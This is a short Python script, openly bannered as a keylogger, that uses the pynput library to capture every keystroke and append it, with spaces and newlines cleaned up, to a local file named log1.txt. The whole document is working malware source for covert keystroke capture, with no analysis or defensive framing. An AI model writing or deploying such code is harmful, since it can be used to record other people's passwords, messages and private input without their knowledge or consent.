from pynput.keyboard import Listener
import pyfiglet

ascii_banner = pyfiglet.figlet_format("KeyLogger By SUDOMOSH")
print(ascii_banner)

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")
    
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log1.txt", "a") as f:
        f.write(letter)


with Listener(on_press = writetofile) as l:
    l.join()
